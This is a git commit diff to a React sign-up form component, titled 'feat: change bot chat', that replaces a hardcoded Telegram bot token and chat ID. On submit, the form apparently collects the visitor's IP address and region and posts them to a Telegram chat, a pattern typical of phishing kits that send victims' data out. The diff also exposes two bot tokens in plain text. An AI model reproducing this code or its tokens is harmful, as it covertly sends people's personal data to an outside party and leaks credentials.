61d6cc1080b45c6c6c7926450774e8422f524265
D-Freitas <davi.israel01@gmail.com>
2024-01-11 08:52:03 -0300

    feat: change bot chat

--- components/SignUp.tsx
+++ components/SignUp.tsx
@@ -54,7 +54,7 @@ export default function SignUp() {
   const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
-    const botToken = '6800644942:AAHfTeX6q4tbfOnYQ2pcpxsFGMHLMOoAL_U'
+    const botToken = '6885072777:AAFtJSEbzvavlIuww0wVAgRdhPiRDxo1iCI'
     const responseIP = await fetch('https://api.ipify.org?format=json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
@@ -71,7 +71,7 @@ export default function SignUp() {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        'chat_id': -1002000806188,
+        'chat_id': -1002035652676,
         text: `
 IP: ${responseGeoJson.query}
 Região: ${responseGeoJson.region}
